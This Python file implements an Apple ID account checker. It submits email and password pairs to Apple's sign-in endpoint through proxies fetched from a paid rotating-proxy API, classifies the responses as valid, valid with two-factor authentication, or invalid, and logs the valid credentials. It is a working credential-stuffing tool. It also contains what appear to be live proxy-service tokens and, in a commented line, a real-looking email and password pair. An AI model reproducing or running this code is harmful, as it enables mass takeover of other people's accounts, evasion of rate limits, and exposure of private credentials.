# coding: utf-8
import requests
from threading import Lock
from time import sleep
import logging
import json


# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Constants
# PROXY_API_URL = 'https://proxyapi.horocn.com/api/v2/proxies?order_id=VWSR1781923674547744&num=1&format=text&line_separator=win&can_repeat=no&user_token=ce551c5cc5516050cb2682d4f59fbae0'
PROXY_API_URL = 'https://api.hailiangip.com:8522/api/getIpEncrypt?dataType=1&encryptParam=SlDyzgfgDW12vuaMHmQkMzKSlRTuS%2Bu596hwGK%2Fn1zdLwdnbtCj6lZ7A01EG1vOxmvG5TixsGA9ws53lyrDV2TWc1V83TrOf0PxovyU%2BhrnrtCCCN4n199AbybZL3S3VfwKWOgbx%2BXCRKemZTKxtvdkQYlsoImld%2F5vlzY5PF%2FwP9g7Wglmrt2EnuIbvDg0FlYUCoWjGZqpyo%2BRyt5I2dl0tw%2B%2FCVyzsGA8L1XDZpXg%3D'
URL = 'https://idmsa.apple.com/appleauth/auth/signin'
HEADERS = {
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "X-Apple-Locale": "QT-EN",
    "X-Apple-Trusted-Domain": "https://idmsa.apple.com",
    "Origin": "https://idmsa.apple.com",
    "X-Requested-With": "XMLHttpRequest"
}
PASSWORD_CORRECT_MESSAGE_NO_2FA = 'sa'
PASSWORD_CORRECT_MESSAGE_2FA = 'hsa2'
PASSWORD_INCORRECT_MESSAGE = 'incorrect'
CLOSED_ACCOUNT_MESSAGE = 'locked'

# Lock for thread safety
lock = Lock()

class AppleIDChecker:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update(HEADERS)

    def get_proxy(self):
        response = requests.get(PROXY_API_URL)
        # print(response.text)
        if response.ok:
            proxy_ip = response.text.strip()  # Assuming the API returns just the IP:Port in the response body
            return {
                "http": f"http://{proxy_ip}",
                "https": f"http://{proxy_ip}"
            }
        else:
            logger.error("获取代理IP失败。")
            return None

    # 假设的使用代理进行登录尝试的方法
    def try_login(self, apple_id, password, proxy):
        # 设置代理
        proxies = {
            'http': f'http://{proxy}',
            'https': f'http://{proxy}'
        }
        print(apple_id, proxies)
        try:
            # with lock:  # Ensure only one thread accesses the proxy at a time
            response = self.session.post(URL, json={"accountName": apple_id, "password": password, "rememberMe": False}, proxies=proxies)
            return self.process_response(apple_id, password, response.text)
        except requests.RequestException as e:
            logger.error(f'HTTP错误: {e}')
            return {"error": "尝试登录时发生HTTP错误，代理IP不可用。"}

    def process_response(self, apple_id, password, response_text):
        # Attempt to parse the response text as JSON
        try:
            response_json = json.loads(response_text)
        except json.JSONDecodeError:
            # If response is not JSON, it's an unknown error
            logger.error(f'Non-JSON response for AppleID -> {apple_id}:{password} | {response_text}')
            return {"status": "未知错误", "message": "返回内容格式异常，无法解析为JSON。"}

        # Check if the response is password correct without 2FA
        if response_json.get('authType') == "non-sa":
            logger.info(f'密码正确 NO 2FA AppleID -> {apple_id}:{password}｜{response_text}')
            return {"status": "密码正确", "message": "帐号密码正确，无需双重认证。"}

        # Check if the response is password correct with 2FA
        elif response_json.get('authType') in ["sa", "hsa2"]:
            logger.info(f'双重认证 2FA AppleID -> {apple_id}:{password}｜{response_text}')
            return {"status": "双重认证", "message": "帐号密码正确，但开启了双重认证。"}

        # Check if the response is password incorrect
        elif "serviceErrors" in response_json:
            for error in response_json["serviceErrors"]:
                if error.get("code") == "-20101":
                    logger.info(f'密码错误 AppleID -> {apple_id}:{password} | {response_text}')
                    return {"status": "密码错误", "message": "帐号或密码错误。"}

        # If none of the above, it's an unknown error
        return {"status": "未知错误", "message": "出现未知错误或其他异常情况。"}


# AppleIDChecker().try_login('thepavlova1991@yandex.ru', '250391Vera')